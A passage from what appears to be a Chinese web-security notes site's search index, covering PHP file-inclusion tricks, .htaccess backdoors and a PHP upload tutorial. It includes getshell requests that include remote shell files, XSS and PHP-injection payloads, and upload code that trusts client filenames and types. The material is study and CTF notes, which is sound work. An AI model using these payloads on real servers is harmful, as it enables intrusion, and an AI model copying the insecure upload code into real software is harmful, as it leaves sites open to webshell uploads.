\u6216\u8005\u5176\u5b83\u652f\u6301\u7684\u5c01\u88c5\u534f\u8bae\u2014\u2014\u89c1\u652f\u6301\u7684\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae\uff09\u800c\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u6765\u6307\u5b9a\u8981\u88ab\u5305\u542b\u7684\u6587\u4ef6\u3002\u5982\u679c\u76ee\u6807\u670d\u52a1\u5668\u5c06\u76ee\u6807\u6587\u4ef6\u4f5c\u4e3a PHP \u4ee3\u7801\u89e3\u91ca\uff0c\u5219\u53ef\u4ee5\u7528\u9002\u7528\u4e8e HTTP GET \u7684 URL \u8bf7\u6c42\u5b57\u7b26\u4e32\u6765\u5411\u88ab\u5305\u62ec\u7684\u6587\u4ef6\u4f20\u9012\u53d8\u91cf\u3002\u4e25\u683c\u7684\u8bf4\u8fd9\u548c\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u5e76\u7ee7\u627f\u7236\u6587\u4ef6\u7684\u53d8\u91cf\u7a7a\u95f4\u5e76\u4e0d\u662f\u4e00\u56de\u4e8b\uff1b\u8be5\u811a\u672c\u6587\u4ef6\u5b9e\u9645\u4e0a\u5df2\u7ecf\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\uff0c\u800c\u672c\u5730\u811a\u672c\u5219\u5305\u62ec\u4e86\u5176\u7ed3\u679c\u3002 \u652f\u6301\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 file:// \u8fd9\u4e2a\u534f\u8bae\u53ef\u4ee5\u5c55\u73b0\u672c\u5730\u6587\u4ef6\u7cfb\u7edf,\u9ed8\u8ba4\u76ee\u5f55\u662f\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 file:///path/to/file.ext \u5728\u6587\u4ef6\u5305\u542b\u4e2d\u5176\u5b9e\u4e5f\u5c31\u662f\u7b49\u4ef7 /path/to/file.ext` \u4f46\u662f\u5982\u679c\u6765\u4e2a\u9898\u76ee\u7ed9\u4f60\u6765\u4e2a\u6b63\u5219\u5339\u914d`../` \u6216`/ \u5f00\u5934\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4e86\u3002 php:// (1)php://input\u662f\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41 (2)php://filter \u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c \u8bbe\u8ba1\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7684\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528 1 2 3 4 5 6 7 1 readfile(\"http://www.example.com\"); \u7b49\u4ef7\u4e8ereadfile(\"php://filter/resource=http://www.example.com\"); 2 \u8bfb\u53d6\u94fe file_get_contents(\"php://filter/read=convert.base64-encode/resource=test.php\"); 3. \u5199\u5165\u94fe file_put_contents(\"php://filter/write=convert.base64-decode/resource=[file]\",\"base64\"); \u8fd9\u4e2a\u70b9\u5728ctf\u6709\u65f6\u5019\u4f1a\u5f88\u6709\u7528,\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9bwaf (3)php://input \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41, \u5c06post\u8bf7\u6c42\u4e2d\u7684\u6570\u636e\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c\u3002 \u6709\u81ea\u8eab\u5c40\u9650\u6027: allow_url_fopen :off/on (\u9ed8\u8ba4\u914d\u7f6eon) allow_url_include:on (\u9ed8\u8ba4\u914d\u7f6eoff)","title":"\u6587\u4ef6\u5305\u542b\u51fd\u6570"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#getshell","text":"","title":"GetShell\u601d\u8def"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#allow_url_include","text":"allow_url_include \u9ed8\u8ba4\u73af\u5883\u5728php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aoff,\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u7528\u6cd5\u6bd4\u8f83\u9e21\u808b,\u4f46\u662f\u5e73\u65f6\u5728\u770bphpinfo\u7684\u65f6\u5019\u53ef\u4ee5\u67e5\u770b\u4e0b\u8fd9\u4e2a\u662f\u5426\u5f00\u542f\u3002 allow_url_fopen \u9ed8\u8ba4\u5f00\u542f,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u8fdc\u7a0burl\u6216\u8005php://\u534f\u8bae\u76f4\u63a5getshell 1. http://127.0.0.1:8888/ctf/cli/3.php?file=http://remote.com/shell.txt 2. http://127.0.0.1:8888/ctf/cli/3.php?file=php://input PostData:<?php phpinfo();?> \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u70b9\u7684\u662f\u6d4f\u89c8\u5668\u5728\u4f20\u8f93\u8fc7\u7a0b\u4f1a\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884curl\u7f16\u7801,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528burp\u7ed5\u8fc7\u8fd9\u4e00\u6b65 \u6216\u8005\u76f4\u63a5curl \u547d\u4ee4 curl -v \"http://127.0.0.1:8888/ctf/cli/3.php?file=php://input\" -d \"<?php phpinfo();?>\" 3. http://10.211.55.20:8081/test.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg== \u901a\u8fc7 data:// \u534f\u8bae\u53ef\u4ee5\u76f4\u63a5\u89e3\u6790base64\u7f16\u7801","title":"allow_url_include \u5f00\u542f\u7684\u60c5\u51b5"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#allow_url_include-offwindow","text":"\u5c31\u7b97\u5373\u4f7f allow_url_include and allow_url_fopen \u5747\u4e3aoff \u5728 window\u4e3b\u673a\u73af\u5883 \u4e0b\u4ecd\u7136\u53ef\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u6267\u884c 1\uff1a\u4ec0\u4e48\u662fUNC\u8def\u5f84\uff1fUNC\u8def\u5f84\u5c31\u662f\u7c7b\u4f3c\\softer\u8fd9\u6837\u7684\u5f62\u5f0f\u7684\u7f51\u7edc\u8def\u5f84\u3002 2\uff1aUNC\u4e3a\u7f51\u7edc\uff08\u4e3b\u8981\u6307\u5c40\u57df\u7f51\uff09\u4e0a\u8d44\u6e90\u7684\u5b8c\u6574Windows 2000\u540d\u79f0\u3002 \u6ce8\u610f\u4e3b\u8981\u8fd9\u4e2a\u5b57,\u6240\u4ee5\u8bf4\u4e5f\u652f\u6301\u8fdc\u7a0b\u7f51\u7edc \u683c\u5f0f\uff1a\\servername\\sharename\uff0c\u5176\u4e2dservername\u662f\u670d\u52a1\u5668\u540d\u3002sharename\u662f\u5171\u4eab\u8d44\u6e90\u7684\u540d\u79f0\u3002 \u76ee\u5f55\u6216\u6587\u4ef6\u7684UNC\u540d\u79f0\u53ef\u4ee5\u5305\u62ec\u5171\u4eab\u540d\u79f0\u4e0b\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u683c\u5f0f\u4e3a\uff1a\\servername\\sharename\\directory\\filename\u3002 2\uff1aunc\u5171\u4eab\u5c31\u662f\u6307 \u7f51\u7edc\u786c\u76d8 \u7684\u5171\u4eab \u56e0\u4e3a allow_url_include \u4e3aoff\u7684\u65f6\u5019,php\u4e0d\u4f1a\u52a0\u8f7d\u8fdc\u7a0b\u7684http \u6216\u8005 ftp\u7684url,\u4f46\u662f\u6ca1\u6709\u7981\u6b62SMB\u7684URL\u52a0\u8f7d\u3002 \u56e0\u4e3aSMB share\u670d\u52a1\u5668\u9700\u8981\u7528UNC\u8def\u5f84\u53bb\u8bbf\u95ee,\u800cLinux\u6ca1\u6709UNC\u8def\u5f84\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u5728window\u4e0b\u5229\u7528","title":"allow_url_include \u5173\u95ed\u53ccoff\u7684\u60c5\u51b5(window\u73af\u5883\u4e0b)"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_3","text":"\u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u5176\u5b9e\u5728\u5b9e\u6218\u4e2d\u662f\u6bd4\u8f83\u9e21\u808b\u7684,\u56e0\u4e3a\u9ed8\u8ba4\u7684\u6743\u9650\u662f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7684,\u4f46\u662f\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u4e0b\u3002 \u4e0d\u8fc7\u5982\u679c\u4e3b\u673a\u662fwindow\u7cfb\u7edf,\u50cfphpstudy\u90a3\u79cd\u4e00\u952e\u5b89\u88c5\u7684\u90fd\u5177\u6709\u9ad8\u6743\u9650,\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7\u5305\u542b\u4e00\u4e9b\u6587\u4ef6\u6765getshell\u3002","title":"\u5c1d\u8bd5\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u3001\u73af\u5883\u6587\u4ef6\u7b49\u53ef\u63a7\u6587\u4ef6"},{"location":"upload/","text":"\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6587\u4ef6\u4e0a\u4f20\u662f\u4e00\u79cd\u6bd4\u4ef7\u96be\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u6545\u5355\u72ec\u62c9\u51fa\u6765\u4ed4\u7ec6\u5206\u6790","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"upload/#_1","text":"\u6587\u4ef6\u4e0a\u4f20\u662f\u4e00\u79cd\u6bd4\u4ef7\u96be\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u6545\u5355\u72ec\u62c9\u51fa\u6765\u4ed4\u7ec6\u5206\u6790","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/","text":".htaccess\u6784\u6210\u7684\u540e\u95e8 \u00b6 \u4e3e\u4f8b\uff1a \u00b6 Example 1a: file inclusion \u00b6 index.php: (empty) .htaccess: 1 php_value auto_append_file /etc/hosts Example 1b: PHP code execution \u00b6 index.php: (empty) .htaccess: 1 2 php_value auto_append_file .htaccess #<?php phpinfo(); Example 1c: (direct/remote) file inclusion \u00b6 index.php: (empty) .htaccess: 1 2 3 4 php_flag allow_url_include 1 php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B #php_value auto_append_file https://sektioneins.de/evil-code.txt Example 1d: XSS and PHP code execution with UTF-7 \u00b6 index.php: (empty) .htaccess: 1 2 3 4 php_flag zend.multibyte 1 php_value zend.script_encoding \"UTF-7\" php_value auto_append_file .htaccess #+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs Example 2a: XSS via error message link \u00b6 index.php: (produces error message) 1 2 <?php include('foo'); .htaccess: 1 2 3 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \"'><script>alert(1);</script>\" Example 2b: XSS via error message link extension \u00b6 index.php: 1 2 <?php include('foo'); .htaccess: 1 2 3 4 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \"x\" php_value docref_ext \"<script>alert(1);</script>\" Example 3a: XSS via phps color \u00b6 Assumtion: phps source handler is activated. 1 2 3 4 5 <FilesMatch \".+\\.phps$\"> SetHandler application/x-httpd-php-source Order Allow,Deny Allow from all </FilesMatch> index.phps: 1 2 3 4 5 <?php test(); // comment ?> text .htaccess: 1 php_value highlight.comment '\"><script>alert(1);</script>' Example 3b: XSS via highlight_file() color \u00b6 index.php: 1 2 3 <?php highlight_file(__FILE__); // comment .htaccess: 1 php_value highlight.comment '\"><script>alert(1);</script>' Example 4a: failed PHP injection via error_log and include_path \u00b6 In this example PHP correctly encodes HTML entities in log messages. The injection fails. index.php: 1 <?php include('foo'); .htaccess: 1 2 php_value error_log /var/www/ex4a/foo.php php_value include_path \"<?php phpinfo(); __halt_compiler();\" Example 4b: failed PHP injection via error_log and auto_prepend_file \u00b6 index.php: (empty) .htaccess: 1 2 php_value error_log /var/www/ipc/ex4b/foo.php php_value auto_prepend_file \"<?php phpinfo(); __halt_compiler();\" Example 4c: PHP code injection via error_log and UTF-7 \u00b6 index.php: (empty) .htaccess: 1 2 3 4 5 6 php_value error_log /var/www/ipc/ex4c/foo.php #---- \"<?php phpinfo(); __halt_compiler();\" in UTF-7: php_value include_path \"+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs\" php_flag zend.multibyte 1 php_value zend.script_encoding \"UTF-7\" Example 6: Source code disclosure \u00b6 index.php: 1 <?php some_code(); .htaccess: 1 php_flag engine 0 StackOverflow\u4e0a\u4e00\u4e2a\u95ee\u9898\uff1a \u00b6 For example directory named test placed .htacess with the only code in the first line php_flag engine off In directory test placed file test.php with this code echo 1+3; And in another file ( main.php ) placed include(\"test.php\"); Open main.php and see 4 (result of 1+3). Added AddType text/plain .php .phtml .php3 . The same result. I expected because of php_flag engine off code in test.php would not execute. answer: \u00b6 The .htaccess directives are only relevant to Apache when processing the request. It will prevent Apache from directly executing the test.php file (or rather, it will prevent PHP from doing anything when Apache invokes it). However, if Apache is executing a script in some other folder, then you have a running PHP instance. This instance can do whatever it wants. It will not interpret any further .htaccess files or regard any php_flag directives, since those only apply before PHP was started. Once it's running it's running. .htaccess files are only interpreted by Apache as follows: given path is /foo/bar/test.php Apache checks if /.htaccess exists, applies its rules if so Apache checks if /foo/.htaccess exists, applies its rules if so Apache checks if /foo/bar/.htaccess exists, applies its rules if so PHP on the other hand just directly includes foo/bar/test.php , it doesn't look for or interpret .htaccess files. \u53c2\u8003 \u00b6 StackOverflow","title":".htaccess\u6784\u6210\u7684\u540e\u95e8"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#htaccess","text":"","title":".htaccess\u6784\u6210\u7684\u540e\u95e8"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#_1","text":"","title":"\u4e3e\u4f8b\uff1a"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-1a-file-inclusion","text":"index.php: (empty) .htaccess: 1 php_value auto_append_file /etc/hosts","title":"Example 1a: file inclusion"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-1b-php-code-execution","text":"index.php: (empty) .htaccess: 1 2 php_value auto_append_file .htaccess #<?php phpinfo();","title":"Example 1b: PHP code execution"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-1c-directremote-file-inclusion","text":"index.php: (empty) .htaccess: 1 2 3 4 php_flag allow_url_include 1 php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B #php_value auto_append_file https://sektioneins.de/evil-code.txt","title":"Example 1c: (direct/remote) file inclusion"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-1d-xss-and-php-code-execution-with-utf-7","text":"index.php: (empty) .htaccess: 1 2 3 4 php_flag zend.multibyte 1 php_value zend.script_encoding \"UTF-7\" php_value auto_append_file .htaccess #+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs","title":"Example 1d: XSS and PHP code execution with UTF-7"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-2a-xss-via-error-message-link","text":"index.php: (produces error message) 1 2 <?php include('foo'); .htaccess: 1 2 3 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \"'><script>alert(1);</script>\"","title":"Example 2a: XSS via error message link"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-2b-xss-via-error-message-link-extension","text":"index.php: 1 2 <?php include('foo'); .htaccess: 1 2 3 4 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \"x\" php_value docref_ext \"<script>alert(1);</script>\"","title":"Example 2b: XSS via error message link extension"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-3a-xss-via-phps-color","text":"Assumtion: phps source handler is activated. 1 2 3 4 5 <FilesMatch \".+\\.phps$\"> SetHandler application/x-httpd-php-source Order Allow,Deny Allow from all </FilesMatch> index.phps: 1 2 3 4 5 <?php test(); // comment ?> text .htaccess: 1 php_value highlight.comment '\"><script>alert(1);</script>'","title":"Example 3a: XSS via phps color"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-3b-xss-via-highlight_file-color","text":"index.php: 1 2 3 <?php highlight_file(__FILE__); // comment .htaccess: 1 php_value highlight.comment '\"><script>alert(1);</script>'","title":"Example 3b: XSS via highlight_file() color"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-4a-failed-php-injection-via-error_log-and-include_path","text":"In this example PHP correctly encodes HTML entities in log messages. The injection fails. index.php: 1 <?php include('foo'); .htaccess: 1 2 php_value error_log /var/www/ex4a/foo.php php_value include_path \"<?php phpinfo(); __halt_compiler();\"","title":"Example 4a: failed PHP injection via error_log and include_path"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-4b-failed-php-injection-via-error_log-and-auto_prepend_file","text":"index.php: (empty) .htaccess: 1 2 php_value error_log /var/www/ipc/ex4b/foo.php php_value auto_prepend_file \"<?php phpinfo(); __halt_compiler();\"","title":"Example 4b: failed PHP injection via error_log and auto_prepend_file"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-4c-php-code-injection-via-error_log-and-utf-7","text":"index.php: (empty) .htaccess: 1 2 3 4 5 6 php_value error_log /var/www/ipc/ex4c/foo.php #---- \"<?php phpinfo(); __halt_compiler();\" in UTF-7: php_value include_path \"+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs\" php_flag zend.multibyte 1 php_value zend.script_encoding \"UTF-7\"","title":"Example 4c: PHP code injection via error_log and UTF-7"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#example-6-source-code-disclosure","text":"index.php: 1 <?php some_code(); .htaccess: 1 php_flag engine 0","title":"Example 6: Source code disclosure"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#stackoverflow","text":"For example directory named test placed .htacess with the only code in the first line php_flag engine off In directory test placed file test.php with this code echo 1+3; And in another file ( main.php ) placed include(\"test.php\"); Open main.php and see 4 (result of 1+3). Added AddType text/plain .php .phtml .php3 . The same result. I expected because of php_flag engine off code in test.php would not execute.","title":"StackOverflow\u4e0a\u4e00\u4e2a\u95ee\u9898\uff1a"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#answer","text":"The .htaccess directives are only relevant to Apache when processing the request. It will prevent Apache from directly executing the test.php file (or rather, it will prevent PHP from doing anything when Apache invokes it). However, if Apache is executing a script in some other folder, then you have a running PHP instance. This instance can do whatever it wants. It will not interpret any further .htaccess files or regard any php_flag directives, since those only apply before PHP was started. Once it's running it's running. .htaccess files are only interpreted by Apache as follows: given path is /foo/bar/test.php Apache checks if /.htaccess exists, applies its rules if so Apache checks if /foo/.htaccess exists, applies its rules if so Apache checks if /foo/bar/.htaccess exists, applies its rules if so PHP on the other hand just directly includes foo/bar/test.php , it doesn't look for or interpret .htaccess files.","title":"answer:"},{"location":"upload/htaccess\u6784\u6210\u7684\u540e\u95e8/#_2","text":"StackOverflow","title":"\u53c2\u8003"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/","text":"PHP\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u4e0a\u4f20\u8868\u5355\u7684\u5efa\u7acb \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < html > < head > < meta charset = \"utf-8\" > < title > \u83dc\u9e1f\u6559\u7a0b(runoob.com) </ title > </ head > < body > < form action = \"upload_file.php\" method = \"post\" enctype = \"multipart/form-data\" > < label for = \"file\" > \u6587\u4ef6\u540d\uff1a </ label > < input type = \"file\" name = \"file\" id = \"file\" >< br > < input type = \"submit\" name = \"submit\" value = \"\u63d0\u4ea4\" > </ form > </ body > </ html > \u6807\u7b7e\u7684 enctype \u5c5e\u6027\u89c4\u5b9a\u4e86\u5728\u63d0\u4ea4\u8868\u5355\u65f6\u8981\u4f7f\u7528\u54ea\u79cd\u5185\u5bb9\u7c7b\u578b\u3002\u5728\u8868\u5355\u9700\u8981\u4e8c\u8fdb\u5236\u6570\u636e\u65f6\uff0c\u6bd4\u5982\u6587\u4ef6\u5185\u5bb9\uff0c\u8bf7\u4f7f\u7528 \" multipart/form-data \"\u3002 action \u6307\u660e\u4e86\u540e\u7aef\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u6b64\u5904\u662f upload_file.php method \u8868\u793a\u662fpost\u63d0\u4ea4 \u521b\u5efa\u4e0a\u4f20\u811a\u672c \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php if ( $_FILES [ \"file\" ][ \"error\" ] > 0 ) { echo \"\u9519\u8bef\uff1a\" . $_FILES [ \"file\" ][ \"error\" ] . \"<br>\" ; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES [ \"file\" ][ \"name\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES [ \"file\" ][ \"type\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ( $_FILES [ \"file\" ][ \"size\" ] / 1024 ) . \" kB<br>\" ; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES [ \"file\" ][ \"tmp_name\" ]; } ?> $_FILES[\"file\"][\"name\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u540d\u79f0 $_FILES[\"file\"][\"type\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b $_FILES[\"file\"][\"size\"] - \u4e0a\u4f20\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u8ba1 $_FILES[\"file\"][\"tmp_name\"] - \u5b58\u50a8\u5728\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7684\u4e34\u65f6\u526f\u672c\u7684\u540d\u79f0 $_FILES[\"file\"][\"error\"] - \u7531\u6587\u4ef6\u4e0a\u4f20\u5bfc\u81f4\u7684\u9519\u8bef\u4ee3\u7801 \u5b8c\u5584\u4e00\u70b9\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 <?php // \u5141\u8bb8\u4e0a\u4f20\u7684\u56fe\u7247\u540e\u7f00 $allowedExts = array ( \"gif\" , \"jpeg\" , \"jpg\" , \"png\" ); $temp = explode ( \".\" , $_FILES [ \"file\" ][ \"name\" ]); $extension = end ( $temp ); // \u83b7\u53d6\u6587\u4ef6\u540e\u7f00\u540d if ((( $_FILES [ \"file\" ][ \"type\" ] == \"image/gif\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/jpeg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/jpg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/pjpeg\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/x-png\" ) || ( $_FILES [ \"file\" ][ \"type\" ] == \"image/png\" )) && ( $_FILES [ \"file\" ][ \"size\" ] < 204800 ) // \u5c0f\u4e8e 200 kb && in_array ( $extension , $allowedExts )) { if ( $_FILES [ \"file\" ][ \"error\" ] > 0 ) { echo \"\u9519\u8bef\uff1a: \" . $_FILES [ \"file\" ][ \"error\" ] . \"<br>\" ; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES [ \"file\" ][ \"name\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES [ \"file\" ][ \"type\" ] . \"<br>\" ; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ( $_FILES [ \"file\" ][ \"size\" ] / 1024 ) . \" kB<br>\" ; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES [ \"file\" ][ \"tmp_name\" ]; } } else { echo \"\u975e\u6cd5\u7684\u6587\u4ef6\u683c\u5f0f\" ; } ?> \u6293\u83b7\u7684\u6570\u636e\u5305\u5982\u4e0b\uff1a \u4e3a\u4e86\u6e05\u6670\u5730\u5c55\u793a\u6570\u636e\u5305\uff0c\u5220\u6389\u4e86\u4e00\u4e9b\u6587\u4ef6\u5185\u5bb9 \u53ef\u4ee5\u968f\u610f\u4fee\u6539 \u4fdd\u5b58\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if ($_FILES[\"file\"][\"error\"] > 0) { echo \"\u9519\u8bef\uff1a: \" . $_FILES[\"file\"][\"error\"] . \"<br>\"; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES[\"file\"][\"name\"] . \"<br>\"; echo \"\u6587\u4ef6\u7c7b\u578b: \" . $_FILES[\"file\"][\"type\"] . \"<br>\"; echo \"\u6587\u4ef6\u5927\u5c0f: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\"; echo \"\u6587\u4ef6\u4e34\u65f6\u5b58\u50a8\u7684\u4f4d\u7f6e: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br>\"; // \u5224\u65ad\u5f53\u671f\u76ee\u5f55\u4e0b\u7684 upload \u76ee\u5f55\u662f\u5426\u5b58\u5728\u8be5\u6587\u4ef6 // \u5982\u679c\u6ca1\u6709 upload \u76ee\u5f55\uff0c\u4f60\u9700\u8981\u521b\u5efa\u5b83\uff0cupload \u76ee\u5f55\u6743\u9650\u4e3a 777 if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" \u6587\u4ef6\u5df2\u7ecf\u5b58\u5728\u3002 \"; } else { // \u5982\u679c upload \u76ee\u5f55\u4e0d\u5b58\u5728\u8be5\u6587\u4ef6\u5219\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230 upload \u76ee\u5f55\u4e0b move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"\u6587\u4ef6\u5b58\u50a8\u5728: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } \u53c2\u8003 \u00b6 \u83dc\u9e1f\u6559\u7a0b","title":"PHP\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/#php","text":"","title":"PHP\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 < html > < head > < meta charset = \"utf-8\" > < title > \u83dc\u9e1f\u6559\u7a0b(runoob.com) </ title > </ head > < body > < form action = \"upload_file.php\" method = \"post\" enctype = \"multipart/form-data\" > < label for = \"file\" > \u6587\u4ef6\u540d\uff1a </ label > < input type = \"file\" name = \"file\" id = \"file\" >< br > < input type = \"submit\" name = \"submit\" value = \"\u63d0\u4ea4\" > </ form > </ body > </ html > \u6807\u7b7e\u7684 enctype \u5c5e\u6027\u89c4\u5b9a\u4e86\u5728\u63d0\u4ea4\u8868\u5355\u65f6\u8981\u4f7f\u7528\u54ea\u79cd\u5185\u5bb9\u7c7b\u578b\u3002\u5728\u8868\u5355\u9700\u8981\u4e8c\u8fdb\u5236\u6570\u636e\u65f6\uff0c\u6bd4\u5982\u6587\u4ef6\u5185\u5bb9\uff0c\u8bf7\u4f7f\u7528 \" multipart/form-data \"\u3002 action \u6307\u660e\u4e86\u540e\u7aef\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u6b64\u5904\u662f upload_file.php method \u8868\u793a\u662fpost\u63d0\u4ea4","title":"\u4e0a\u4f20\u8868\u5355\u7684\u5efa\u7acb"},{"location":"upload/php\u5b9e\u73b0\u6587\u4ef6\u4e0a\u4f20/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 <?php if ( $_FILES [ \"file\" ][ \"error\" ] > 0 ) { echo \"\u9519\u8bef\uff1a\" . $_FILES [ \"file\" ][ \"error\" ] . \"<br>\" ; } else { echo \"\u4e0a\u4f20\u6587\u4ef6\u540d: \" . $_FILES [ \"file\" ][ 